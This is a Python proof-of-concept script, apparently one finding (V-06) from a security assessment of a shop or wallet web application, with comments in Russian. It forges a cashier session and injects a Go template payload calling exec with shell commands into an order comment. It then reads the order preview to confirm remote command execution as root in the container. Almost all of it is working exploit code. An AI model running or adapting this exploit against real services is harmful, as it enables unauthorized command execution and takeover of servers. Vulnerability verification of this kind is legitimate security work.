# -*- coding: utf-8 -*-
"""V-06. RCE через SSTI в превью чека.

handlers_shop.go, orderPreview?renderer=classic: пользовательский item_comment
склеивается в исходник text/template, у которого есть функция exec(cmd).
Комментарий заказа задаём на оформлении, получаем выполнение команд в контейнере
(который вдобавок работает под root — uid=0).
"""
import re

from wallet_client import Client, parser, banner, ok, fail


def main():
    a = parser("SSTI -> RCE в превью чека").parse_args()
    c = Client(a.base)
    c.forge(4, "cashier")  # uid 4 = kassa, хватает баланса на покупку

    c.post_form("/cart/add", {"product_id": "1"})
    cmd = 'id; hostname; cat /etc/hostname'
    body = c.post_form("/checkout/quote", {
        "promo_code": "", "tip_kop": "0", "item_comment": "{{exec \"" + cmd + "\"}}"})[2]
    m = re.search(r'name="quote_id"\s+value="(\d+)"', body.decode("utf-8", "replace"))
    if not m:
        fail("не удалось создать котировку")
    _, hdr, _ = c.post_form("/checkout/confirm", {"quote_id": m.group(1)})
    om = re.search(r"/orders/(\d+)", hdr.get("Location", ""))
    if not om:
        fail("заказ не создан (возможно, не хватило баланса)")
    oid = om.group(1)

    txt = c.get(f"/orders/{oid}/preview?renderer=classic")[2].decode("utf-8", "replace")
    uid = re.search(r"uid=\d+\([^)]*\)", txt)
    if not uid:
        fail("команда не выполнилась")
    banner("вывод команды в контейнере:")
    for line in re.findall(r"uid=\d+\([^)]*\)[^\n<]*", txt)[:1]:
        banner("  " + line)
    if "uid=0(root)" in txt:
        banner("  контейнер работает под root")
    ok(f"RCE подтверждён на заказе #{oid} (renderer=classic)")


if __name__ == "__main__":
    main()
